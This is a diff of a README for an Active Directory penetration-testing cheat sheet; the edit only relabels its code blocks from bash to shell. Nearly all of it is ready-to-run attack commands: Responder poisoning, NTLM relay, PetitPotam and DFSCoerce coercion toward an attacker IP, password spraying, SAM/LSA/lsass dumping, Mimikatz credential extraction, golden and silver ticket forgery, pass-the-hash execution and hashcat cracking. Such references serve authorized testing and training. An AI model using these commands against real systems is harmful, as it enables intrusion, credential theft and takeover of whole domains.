@@ -21,19 +21,19 @@ How to pentest like a Gunnaj
     
   #### Install the dependency NetExec
     
-  ```bash
+  ```shell
   apt install pipx git
   pipx ensurepath
   pipx install git+https://github.com/Pennyw0rth/NetExec
   ```
     
   #### Git clone the repository and make the script executable
-  ```bash
+  ```shell
   git clone https://github.com/lefayjey/linWinPwn
   cd linWinPwn; chmod +x linWinPwn.sh
   ```
   #### Install requirements using the `install.sh` script (using standard account)
-  ```bash
+  ```shell
   chmod +x install.sh
   ./install.sh
   ```
@@ -45,10 +45,10 @@ How to pentest like a Gunnaj
   <details>
     <summary> Installation </summary> 
     
-  ```bash
+  ```shell
   apt-get install bloodhound
   ```
-  ```bash
+  ```shell
   neo4j console
   ```
   #### Navigate to http://localhost:7474/ 
@@ -65,16 +65,16 @@ How to pentest like a Gunnaj
     <summary> Installation </summary> 
   
   #### Installation
-  ```bash
+  ```shell
   apt install pipx git
   pipx ensurepath
   pipx install git+https://github.com/Pennyw0rth/NetExec
   ```
   #### Integrate Bloodhound
-  ```bash
+  ```shell
   nano ~/.nxc/nxc.conf
   ```
-  ```bash
+  ```shell
   [BloodHound]
   bh_enabled = True
   bh_uri = 127.0.0.1
@@ -91,7 +91,7 @@ How to pentest like a Gunnaj
   <details>
     <summary> Installation </summary>
     
-  ```bash
+  ```shell
   gem install evil-winrm
   ```
   </details>
@@ -102,7 +102,7 @@ How to pentest like a Gunnaj
   <details>
     <summary> Installation </summary> 
     
-  ```bash
+  ```shell
   git clone https://github.com/p0dalirius/FindUncommonShares
   ```
   </details>
@@ -113,11 +113,11 @@ How to pentest like a Gunnaj
     <summary> Installation </summary> 
   
   #### Clone this repo
-  ```bash
+  ```shell
   git clone https://github.com/dievus/lnkbomb
   ```
   #### Install prerequirements
-  ```bash
+  ```shell
   pip install -r requirements.txt
   ```
   </details>
@@ -137,16 +137,16 @@ How to pentest like a Gunnaj
     <summary> Installation </summary> 
   
   #### Install prerequirements
-  ```bash
+  ```shell
   pip3 install minidump minikerberos aiowinreg msldap winacl
   ```
   #### Clone this repo
-  ```bash
+  ```shell
   git clone https://github.com/skelsec/pypykatz.git
   cd pypykatz
   ```
   #### Install it
-  ```bash
+  ```shell
   python3 setup.py install
   ```
   </details>
@@ -162,10 +162,10 @@ How to pentest like a Gunnaj
   <details>
     <summary> Installation </summary> 
     
-  ```bash
+  ```shell
   git clone https://github.com/RUB-NDS/PRET && cd PRET
   ```
-  ```bash
+  ```shell
   python -m pip install colorama pysnmP
   ```
   </details>
@@ -198,33 +198,33 @@ How to pentest like a Gunnaj
   
   ### Nmap
   #### Ping scan
-  ```bash
+  ```shell
   sudo nmap -sP -p -oN <output.txt> <IP/mask>
   ```
 
   #### Full scan
-  ```bash
+  ```shell
   sudo nmap -PN -sC -sV -p- -oN <output.txt> <IP/mask>
   ```
 
   #### smb vuln scan
-  ```bash
+  ```shell
   sudo nmap -PN --script smb-vuln* -p139,445 -oN <output.txt> <IP/mask>
   ```
 
   ### Find DC IP
   #### Show domain name and DNS
-  ```bash
+  ```shell
   sudo mncli dev show eth0
   ```
 
   #### Show DC IP
-  ```bash
+  ```shell
   nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
   ```
 
   #### Show DC controllers in cmd
-  ```bash
+  ```shell
   nltest /dclist:<domainname>
   ```
 </details>
@@ -248,7 +248,7 @@ How to pentest like a Gunnaj
   - Module vuln_checks
       - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on identified servers
       - Check for ms17-010, zerologon, petitpotam, nopac, smb-sigining, ntlmv1, runasppl weaknesses
-  ```bash
+  ```shell
    sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -M user <output_dir>
   ```
 
@@ -283,7 +283,7 @@ How to pentest like a Gunnaj
       - Check for ms17-010, ms14-068, zerologon, petitpotam, nopac, smb-signing, ntlmv1, runasppl weaknesses
   - Module mssql_enum
       - Check mssql privilege escalation paths
-  ```bash
+  ```shell
   sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
   ```
 </details>
@@ -293,17 +293,17 @@ How to pentest like a Gunnaj
   <summary> Responder </summary> 
   
   ### Kickstart responder
-  ```bash
+  ```shell
   responder -I eth0
   ```
 
   ### Force lm downgrade
-  ```bash
+  ```shell
   responder -I eth0 --lm
   ```
   
   ### DHCP poisining
-  ```bash
+  ```shell
   responder -I eth0 -d
   ```
  </details>
@@ -311,7 +311,7 @@ How to pentest like a Gunnaj
   <summary> lnkbomb </summary> 
   
   ### Create a lnk file for a share with read/write rights
-  ```bash
+  ```shell
   python3 lnkbomb.py -t <target_IP> -a <attacker_IP> -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows
   ```
    
@@ -325,17 +325,17 @@ How to pentest like a Gunnaj
   <summary> Crackmapexec NTLM-relay </summary>   
 
   ### Evaluate no smb-signing and create an IP txt file for TLMRelayx
-  ```bash
+  ```shell
   crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
   ```
 
   ### NTLMRelayx
-  ```bash
+  ```shell
   sudo python3 ntlmrelayx.py -of <dumofile.txt> -tf <outputIPs.txt> -smb2support
   ```
 
   ### Disbale SMB and HTTP in Responder.conf
-  ```bash
+  ```shell
   [Responder Core]
 
   ; Servers to start
@@ -357,7 +357,7 @@ How to pentest like a Gunnaj
   ```
 
 ### Kicksart responder then
-  ```bash
+  ```shell
   sudo responder -I eth0 -dwv
   ```
 </details>
@@ -366,7 +366,7 @@ How to pentest like a Gunnaj
   <summary> PetitPotam </summary> 
   
   ### Force NTLM authentication
-  ```bash
+  ```shell
   python3 PetitPotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
   ```
 </details> 
@@ -375,7 +375,7 @@ How to pentest like a Gunnaj
   <summary> DFSCoerce </summary> 
   
   ### Force NTLM authentication
-  ```bash
+  ```shell
   python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
   ```
 </details> 
@@ -386,7 +386,7 @@ How to pentest like a Gunnaj
   <summary> NetExec Password spray </summary> 
   
   ### Spray a password on a user list
-  ```bash
+  ```shell
   netexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
   ```
 
@@ -397,7 +397,7 @@ How to pentest like a Gunnaj
 <details>
   <summary> NetExec domain authentication </summary> 
   
-  ```bash
+  ```shell
   sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> 
   ```
 
@@ -406,7 +406,7 @@ How to pentest like a Gunnaj
 <details>
   <summary> NetExec local authentication </summary> 
   
-  ```bash
+  ```shell
   NetExec smb <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
   ```
 
@@ -415,7 +415,7 @@ How to pentest like a Gunnaj
 <details>
   <summary> NetExec rdp authentication </summary> 
   
-  ```bash
+  ```shell
   NetExec rdp <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
   ```
 
@@ -426,7 +426,7 @@ How to pentest like a Gunnaj
 <details>
   <summary> List readable or writable shares </summary> 
 
-```bash
+```shell
 NetExec smb <target_IP> -u <username> -p <password>  --shares --filter-shares READ WRITE
 ```
 
@@ -435,7 +435,7 @@ NetExec smb <target_IP> -u <username> -p <password>  --shares --filter-shares RE
 <details>
   <summary> List uncommon shares </summary> 
 
-```bash
+```shell
 ./FindUncommonShares.py -u <username> -p <password> -d <AD_domain> --dc-ip <Domain_Controller_IP> --check-user-access
 ```
 
@@ -445,17 +445,17 @@ NetExec smb <target_IP> -u <username> -p <password>  --shares --filter-shares RE
   <summary> Mount and unmount shares </summary> 
 
 ### Mount share
-```bash
+```shell
 sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<AD_domain>
 ```
 
 ### Unmount share
-```bash
+```shell
 sudo umount <./folder>
 ```
 
 ### Search for keywords in files
-```bash
+```shell
 grep -i <keyword> *
 ```
 
@@ -468,21 +468,21 @@ grep -i <keyword> *
 
   ### Dump NT:hash with masky with domain user
   #### Get ADCS server name
-  ```bash
+  ```shell
   NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -M adcs
   ```
   #### Retrieve the NT hash using PKINIT
-  ```bash
+  ```shell
   NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
   ```
   
   ### Dump SAM with domain user
-  ```bash
+  ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> --sam
   ```
   
    ### Dump LSA with domain user
-  ```bash
+  ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --lsa
   ```
 </details> 
@@ -491,17 +491,17 @@ grep -i <keyword> *
   <summary> NetExec local authentication </summary> 
   
   ### Dump SAM on local computer
-  ```bash
+  ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --sam
   ```
   
   ### Dump LSA on local computer
-  ```bash
+  ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --lsa
   ```
 
   ### Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
-  ```bash
+  ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
   ```
   
@@ -511,17 +511,17 @@ grep -i <keyword> *
   <summary> NetExec dump with ReadLAPSPassword rights </summary> 
 
   ### Check if the user can read LAPS
-  ```bash
+  ```shell
   NetExec ldap <AD_domain> -u <username> -p <password> -H <hash[LM:NT]> -M laps
   ```
   
   ### Dump SAM 
-  ```bash
+  ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M laps --sam
   ```
   
   ### Dump LSA 
-  ```bash
+  ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --M laps --lsa
   ```
   
@@ -531,12 +531,12 @@ grep -i <keyword> *
   <summary> Run Mimikatz from impackets smb share </summary> 
 
   ### Starting a SMB Server
-  ```bash
+  ```shell
   impacket-smbserver.py <shareName> <sharePath>
   ```
   
   ### Run Mimikatz from host and write output to the share
-  ```bash
+  ```shell
   \\<target_IP>\<shareName>\mimikatz.exe "privilege::debug: sekurlsa::logonpasswords exit" > \\<target_IP>\<shareName>\output.txt
   ```
   
@@ -553,7 +553,7 @@ grep -i <keyword> *
     - NTDS dump using impacket, crackmapexec and certsync
     - Dump lsass on all domain servers using: procdump, lsassy, nanodump, handlekatz, masky 
     - Extract backup keys using DonPAPI, HEKATOMB
-```bash
+```shell
 sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]> -o <output_dir>
 ```
 </details> 
@@ -561,7 +561,7 @@ sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD
 <details>
   <summary> Examine lsass dump with pypykatz </summary> 
 
-```bash
+```shell
 pypykatz lsa minidump lsass.DMP
 ```
 </details> 
@@ -577,11 +577,11 @@ pypykatz lsa minidump lsass.DMP
   * `smbexec` executes commands by creating and running a service
   
   #### command
-  ```bash
+  ```shell
   NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -x <command>
   ```
   #### PowerShell
-  ```bash
+  ```shell
   NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -X <command>
   ```
 </details> 
@@ -589,7 +589,7 @@ pypykatz lsa minidump lsass.DMP
 <details>
   <summary> Evil-WinRM </summary> 
   
-  ```bash
+  ```shell
   evil-winrm -i <target_IP> -u <username> -p <password> -H <hash[LM:NT]>
   ```
 </details> 
@@ -624,25 +624,25 @@ wmic useraccount where name="USER" get sid
 ```
 
 #### Silver ticket
-```bash
+```shell
 python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain>l <user>
 ```
 #### Golden ticket
-```bash
+```shell
 python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> <user>
 ```
 #### Set the ticket for impacket use
-```bash
+```shell
 export KRB5CCNAME=<TGS_ccache_file>
 ```
 
 #### List tickets
-```bash
+```shell
 klist
 ```
 
 #### Execute remote commands with any of the following by using the TGT
-```bash
+```shell
 python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
@@ -651,15 +651,15 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
   <summary> PRET </summary> 
 
   ### Nmap printers
-  ```bash
+  ```shell
   nmap -p 9100 <IP/mask>
   ```
   ### cheat sheet
-  ```bash
+  ```shell
   http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
   ```
   ### Kickstart PRET 
-  ```bash
+  ```shell
   pret.py target {ps,pjl,pcl}
   ```
 </details>
@@ -669,57 +669,57 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
   <summary> Hashcat </summary> 
   
   ### LM
-  ```bash
+  ```shell
   hashcat64.exe -m 3000 -a 3 LM-hashes.txt -o cracked.txt
   ```
 
   ### NTLM
-  ```bash
+  ```shell
   hashcat64.exe -m 1000 -a 3 NTLM-hashes.txt -o cracked.txt
   ```
 
   ### NTLMv1
-  ```bash
+  ```shell
   hashcat64.exe -m 5500 -a 3 NTLMv1-hashes.txt -o cracked.txt
   ```
 
   ### NTLMv2
-  ```bash
+  ```shell
   hashcat64.exe -m 5600 -a 0 NTLMv2-hashes.txt <passlist.txt> -o cracked.txt
   ```
 
   ### Kerberos ASREP
-  ```bash
+  ```shell
   hashcat64.exe -m 18200 -a 0 asrep-hashes.txt <passlist.txt> -o cracked.txt
   ```
 
   ### Kerberos 5 TGS
-  ```bash
+  ```shell
   hashcat64.exe -m 13100 -a 0 krb5tgs-hashes.txt <passlist.txt> -o cracked.txt
   ```
 
   ### Kerberos 5 TGS AES128
-  ```bash
+  ```shell
   hashcat64.exe -m 19600 -a 0 krb5tgsaes128-hashes.txt <passlist.txt> -o cracked.txt
   ```
 
   ### Kerberos 5 TGS AES256
-  ```bash
+  ```shell
   hashcat64.exe -m 19700  -a 0 krb5tgsaes256.txt <passlist.txt> -o cracked.txt
   ```
 
   ### Kerberos 5 etype 17, Pre-Auth
-  ```bash
+  ```shell
   hashcat64.exe -m 19800  -a 0 krb5tetype17.txt <passlist.txt> -o cracked.txt
   ```
 
   ### Kerberos 5 etype 18, Pre-Auth
-  ```bash
+  ```shell
   hashcat64.exe -m 19900  -a 0 krb5tetype18.txt <passlist.txt> -o cracked.txt
   ```
 
   ### MsCache 2 (slow af)
-  ```bash
+  ```shell
   hashcat64.exe -m 2100 -a 0 mscache2-hashes.txt <passlist.txt> -o cracked.txt
   ```
 </details>
